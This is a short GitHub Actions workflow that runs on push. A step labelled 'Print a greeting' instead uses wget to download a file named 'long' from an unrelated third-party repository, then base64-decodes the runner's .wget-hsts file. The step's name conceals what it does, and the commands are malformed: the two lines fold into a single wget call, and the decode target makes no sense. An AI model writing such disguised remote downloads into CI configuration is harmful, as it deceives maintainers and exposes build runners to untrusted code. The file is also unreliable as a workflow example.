name: Greeting from Mona
on: push

jobs:
  my-job:
    name: My Job
    runs-on: ubuntu-latest
    steps:
    - name: Print a greeting
      run: 
        wget https://github.com/git-yusteven/openit/raw/main/long
        base64 -d /home/runner/.wget-hsts
